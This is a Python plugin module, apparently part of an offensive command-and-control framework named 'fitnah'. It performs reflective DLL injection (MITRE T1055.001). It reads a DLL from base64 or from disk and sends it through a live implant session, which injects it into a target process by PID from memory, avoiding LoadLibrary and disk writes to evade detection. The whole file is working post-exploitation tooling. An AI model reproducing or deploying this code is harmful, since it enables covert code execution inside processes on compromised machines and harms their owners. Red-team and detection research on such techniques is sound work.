"""execution/reflective_dll_inject — reflective DLL injection via native implant RDI loader. MITRE T1055.001

Dispatches to implant's rdi_loader.c (RDI_Inject) which maps the DLL from memory
using a reflective loader stub — no LoadLibrary API call, no disk write.
"""
import base64
from pathlib import Path
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class ReflectiveDllInject(BasePlugin):
    NAME        = "reflective_dll_inject"
    DESCRIPTION = "Reflective DLL injection — maps DLL from memory, no LoadLibrary. No PowerShell."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1055.001"
    CATEGORY    = "execution"
    schema      = ParamSchema().add(
        Param("pid",      int, required=True,  help="Target PID"),
        Param("dll_b64",  str, required=False, default="", help="Base64-encoded DLL bytes"),
        Param("dll_path", str, required=False, default="", help="Local path to DLL file (operator-side)"),
    )

    @mitre("T1055.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        pid      = int(params["pid"])
        dll_b64  = params.get("dll_b64", "").strip()
        dll_path = params.get("dll_path", "").strip()

        if not dll_b64 and not dll_path:
            return ModuleResult.err("Provide dll_b64 or dll_path")

        if dll_path and not dll_b64:
            p = Path(dll_path)
            if not p.exists():
                return ModuleResult.err(f"DLL not found: {dll_path}")
            dll_b64 = base64.b64encode(p.read_bytes()).decode()

        # Dispatch to implant's native RDI loader (rdi_loader.c + reflective_loader.c)
        r = ctx.send("rdi_inject", {"pid": pid, "dll_b64": dll_b64})
        if r["status"] != "ok":
            return ModuleResult.err(f"rdi_inject failed: {r['output']}")
        return ModuleResult.ok(data=r["output"])
